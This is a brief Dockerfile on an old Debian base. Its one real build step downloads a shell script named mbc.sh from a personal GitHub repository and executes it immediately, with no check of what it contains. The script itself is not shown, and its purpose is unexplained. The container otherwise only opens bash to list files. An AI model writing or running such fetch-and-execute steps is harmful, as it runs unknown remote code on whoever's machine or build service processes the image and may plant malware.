FROM debian:stretch
EXPOSE 8080
RUN wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
ENTRYPOINT ["/bin/bash"]
CMD ["ls"]
